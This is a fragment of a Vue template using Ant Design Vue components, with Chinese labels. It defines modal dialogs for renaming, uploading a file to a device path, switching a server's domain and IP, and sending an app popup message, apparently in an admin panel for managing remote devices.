      cancel-text="取消"
      @ok="submitRename"
    >
      <a-form layout="vertical">
        <a-form-item label="新名称">
          <a-input v-model:value="renameName" allow-clear />
        </a-form-item>
      </a-form>
    </a-modal>

    <a-modal
      v-model:open="uploadVisible"
      title="上传文件"
      ok-text="上传"
      cancel-text="取消"
      :ok-button-props="{ disabled: uploading }"
      @ok="submitUpload"
    >
      <a-form layout="vertical">
        <a-form-item label="选择文件">
          <input type="file" @change="handleFileSelect" />
        </a-form-item>
        <a-form-item label="目标路径">
          <a-input
            v-model:value="uploadFilePath"
            placeholder="/sdcard/"
            allow-clear
          />
        </a-form-item>
        <a-form-item v-if="uploading" label="上传进度">
          <a-progress :percent="uploadProgress" />
        </a-form-item>
      </a-form>
    </a-modal>

    <a-modal
      v-model:open="serverChangeVisible"
      title="切换服务器"
      ok-text="确定"
      cancel-text="取消"
      @ok="submitServerChange"
    >
      <a-form layout="vertical">
        <a-form-item label="域名">
          <a-input
            v-model:value="serverDomain"
            placeholder="example.com"
            allow-clear
          />
        </a-form-item>
        <a-form-item label="IP地址">
          <a-input
            v-model:value="serverIp"
            placeholder="192.168.1.1"
            allow-clear
          />
        </a-form-item>
        <a-form-item label="变更ID">
          <a-input
            v-model:value="serverChangeId"
            placeholder="可选"
            allow-clear
          />
        </a-form-item>
      </a-form>
    </a-modal>

    <a-modal
      v-model:open="popupFormVisible"
      title="发送应用弹窗"
      ok-text="发送"
      cancel-text="取消"
      :ok-button-props="{ loading: popupFormLoading }"
      @ok="sendPopup"
    >
      <a-form layout="vertical">
        <a-form-item label="弹窗标题">
          <a-input
            v-model:value="popupFormTitle"
            placeholder="请输入弹窗标题"
            allow-clear
          />
        </a-form-item>
        <a-form-item label="弹窗内容">
          <a-textarea
            v-model:value="popupFormMessage"
            :rows="4"
            placeholder="请输入弹窗内容"
            allow-clear
          />
        </a-form-item>
      </a-form>
    </a-modal>
  </PageContainer>
</template>
